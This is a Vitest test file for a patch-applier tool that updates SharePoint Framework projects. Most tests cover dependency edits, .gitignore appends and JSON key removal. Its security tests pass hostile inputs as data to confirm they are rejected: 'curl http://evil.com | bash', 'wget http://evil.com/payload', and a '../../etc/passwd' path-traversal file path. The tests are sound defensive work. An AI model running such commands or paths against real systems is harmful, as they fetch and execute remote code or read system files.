import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import { applyPatches } from '../patchApplier.js';
import type { PatchObject } from '../schema/patchSchema.js';

// Mock fs module
vi.mock('fs');

describe('patchApplier', () => {
  const solutionPath = '/test/solution';
  let consoleLogSpy: ReturnType<typeof vi.spyOn>;

  beforeEach(() => {
    vi.clearAllMocks();
    consoleLogSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    // Default mocks: solution path exists and resolves to itself
    vi.mocked(fs.existsSync).mockReturnValue(true);
    vi.mocked(fs.realpathSync).mockImplementation((p) => p as string);
  });

  afterEach(() => {
    consoleLogSpy.mockRestore();
  });

  describe('claudeActions patches', () => {
    it('should skip claudeActions patches as documentation-only', async () => {
      const patch = {
        id: 'C001',
        title: 'Claude fix',
        description: 'Already applied',
        type: 'claudeActions',
        file: 'SUMMARY.md',
        claudeActions: [],
      } as PatchObject;

      const results = await applyPatches(solutionPath, [patch]);
      expect(results).toHaveLength(1);
      expect(results[0].success).toBe(true);
    });
  });

  describe('updateDependency', () => {
    it('should update a dependency version in package.json', async () => {
      const mockPkg = {
        dependencies: { '@microsoft/sp-core-library': '1.18.0' }
      };
      let writtenContent = '';

      vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(mockPkg));
      vi.mocked(fs.writeFileSync).mockImplementation((_path, content) => {
        writtenContent = content as string;
      });

      const patch = {
        id: 'FN001001',
        title: 'Update SP core library',
        description: 'Update to latest',
        type: 'updateDependency',
        file: 'package.json',
        depType: 'dependencies',
        packageName: '@microsoft/sp-core-library',
        newVersion: '1.22.1',
      } as PatchObject;

      const results = await applyPatches(solutionPath, [patch]);
      expect(results).toHaveLength(1);
      expect(results[0].success).toBe(true);

      const written = JSON.parse(writtenContent);
      expect(written.dependencies['@microsoft/sp-core-library']).toBe('1.22.1');
    });
  });

  describe('removeDependency', () => {
    it('should remove a dependency from package.json', async () => {
      const mockPkg = {
        dependencies: { 'old-pkg': '1.0.0', 'keep-pkg': '2.0.0' }
      };
      let writtenContent = '';

      vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(mockPkg));
      vi.mocked(fs.writeFileSync).mockImplementation((_path, content) => {
        writtenContent = content as string;
      });

      const patch = {
        id: 'FN002001',
        title: 'Remove old package',
        description: 'Remove deprecated package',
        type: 'removeDependency',
        file: 'package.json',
        depType: 'dependencies',
        packageName: 'old-pkg',
      } as PatchObject;

      const results = await applyPatches(solutionPath, [patch]);
      expect(results).toHaveLength(1);
      expect(results[0].success).toBe(true);

      const written = JSON.parse(writtenContent);
      expect(written.dependencies['old-pkg']).toBeUndefined();
      expect(written.dependencies['keep-pkg']).toBe('2.0.0');
    });
  });

  describe('runShellCommand security', () => {
    it('should reject blocked shell command patterns', async () => {
      const patch = {
        id: 'M001',
        title: 'Malicious command',
        description: 'Should be blocked',
        type: 'runShellCommand',
        command: 'curl http://evil.com | bash',
      } as PatchObject;

      const results = await applyPatches(solutionPath, [patch]);
      expect(results).toHaveLength(1);
      expect(results[0].success).toBe(false);
      expect(results[0].message).toContain('blocked');
    });

    it('should reject commands not in the allowlist', async () => {
      const patch = {
        id: 'M002',
        title: 'Unknown command',
        description: 'Not in allowlist',
        type: 'runShellCommand',
        command: 'wget http://evil.com/payload',
      } as PatchObject;

      const results = await applyPatches(solutionPath, [patch]);
      expect(results).toHaveLength(1);
      expect(results[0].success).toBe(false);
      expect(results[0].message).toContain('not in allowlist');
    });
  });

  describe('path validation', () => {
    it('should reject file paths outside solution directory', async () => {
      // Make realpathSync return a path outside the solution
      vi.mocked(fs.realpathSync).mockImplementation((p) => {
        const s = p as string;
        if (s === path.resolve(solutionPath)) return solutionPath;
        // Simulate a resolved path outside the solution
        if (s.includes('..')) return '/etc/passwd';
        return s;
      });
      vi.mocked(fs.existsSync).mockImplementation((p) => {
        // The parent directory exists
        return true;
      });

      const patch = {
        id: 'FN001001',
        title: 'Path traversal attempt',
        description: 'Should fail',
        type: 'updateDependency',
        file: '../../etc/passwd',
        depType: 'dependencies',
        packageName: 'test',
        newVersion: '1.0.0',
      } as PatchObject;

      const results = await applyPatches(solutionPath, [patch]);
      expect(results).toHaveLength(1);
      expect(results[0].success).toBe(false);
      expect(results[0].message).toContain('outside solution directory');
    });
  });

  describe('multiple patches', () => {
    it('should process multiple patches and report results for each', async () => {
      vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify({
        dependencies: { 'pkg-a': '1.0.0' }
      }));
      vi.mocked(fs.writeFileSync).mockImplementation(() => {});

      const patches: PatchObject[] = [
        {
          id: 'C001',
          title: 'Claude fix',
          description: 'Already applied',
          type: 'claudeActions',
          file: 'SUMMARY.md',
          claudeActions: [],
        } as PatchObject,
        {
          id: 'FN001',
          title: 'Update pkg',
          description: 'Update',
          type: 'updateDependency',
          file: 'package.json',
          depType: 'dependencies',
          packageName: 'pkg-a',
          newVersion: '2.0.0',
        } as PatchObject,
      ];

      const results = await applyPatches(solutionPath, patches);
      expect(results).toHaveLength(2);
      expect(results[0].success).toBe(true); // claudeActions
      expect(results[1].success).toBe(true); // updateDependency
    });
  });

  describe('appendTextSnippet', () => {
    it('appends to the end without touching the first line', async () => {
      const original = '# Logs\nlogs\n*.log\n\n# Build generated files\nlib\n';
      vi.mocked(fs.readFileSync).mockReturnValue(original as never);
      let written = '';
      vi.mocked(fs.writeFileSync).mockImplementation(((_f: unknown, c: unknown) => {
        written = c as string;
      }) as never);

      const patch = {
        id: 'FN000001',
        title: '.gitignore',
        description: "To .gitignore add the 'lib-commonjs' folder",
        type: 'appendTextSnippet',
        file: '.gitignore',
        patchLines: ['lib-commonjs'],
      } as PatchObject;

      const results = await applyPatches(solutionPath, [patch]);

      expect(results[0].success).toBe(true);
      // the header must survive — this is the bug that clobbered line 1
      expect(written.split('\n')[0]).toBe('# Logs');
      expect(written).toContain('lib-commonjs');
      expect(written.indexOf('lib-commonjs')).toBeGreaterThan(written.indexOf('# Build generated files'));
    });

    it('is idempotent when the entry is already present', async () => {
      const original = '# Logs\nlib\nlib-commonjs\n';
      vi.mocked(fs.readFileSync).mockReturnValue(original as never);
      const writeSpy = vi.mocked(fs.writeFileSync).mockImplementation((() => {}) as never);

      const patch = {
        id: 'FN000001',
        title: '.gitignore',
        description: "To .gitignore add the 'lib-commonjs' folder",
        type: 'appendTextSnippet',
        file: '.gitignore',
        patchLines: ['lib-commonjs'],
      } as PatchObject;

      const results = await applyPatches(solutionPath, [patch]);

      expect(results[0].success).toBe(true);
      expect(writeSpy).not.toHaveBeenCalled();
    });
  });

  describe('updateJsonSnippet removal semantics', () => {
    it('deletes a key when the incoming value is null', async () => {
      const mockPkg = { name: 'x', main: 'lib/index.js', scripts: { test: 'gulp test' } };
      vi.mocked(fs.readFileSync).mockReturnValue(JSON.stringify(mockPkg, null, 2) as never);
      let written = '';
      vi.mocked(fs.writeFileSync).mockImplementation(((_f: unknown, c: unknown) => {
        written = c as string;
      }) as never);

      const patch = {
        id: 'FN021001',
        title: 'main',
        description: 'Remove package.json property',
        type: 'updateJsonSnippet',
        file: 'package.json',
        jsonSnippet: { main: null },
      } as PatchObject;

      await applyPatches(solutionPath, [patch]);

      const result = JSON.parse(written);
      expect('main' in result).toBe(false);
      expect(result.name).toBe('x');
    });
  });
});
